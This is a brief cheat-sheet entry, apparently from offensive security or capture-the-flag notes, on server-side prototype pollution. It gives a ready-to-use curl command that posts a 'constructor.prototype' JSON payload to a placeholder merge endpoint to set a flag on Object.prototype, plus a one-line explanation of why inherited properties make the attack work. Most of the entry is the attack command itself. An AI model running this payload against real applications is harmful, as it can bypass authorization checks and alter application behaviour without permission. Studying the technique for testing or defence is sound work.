# Prototype Pollution

When a server-side JSON merge doesn't filter `__proto__`/`constructor`/`prototype` keys, pollute `Object.prototype` and flip a flag checked elsewhere in the app.

```bash
curl -s -c cookies.txt -b cookies.txt -X POST http://<TARGET>/<merge-endpoint> \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"<FLAG_FIELD>":true}}}'
```

Works because a plain object with no own `<FLAG_FIELD>` property inherits it through the prototype chain once polluted.

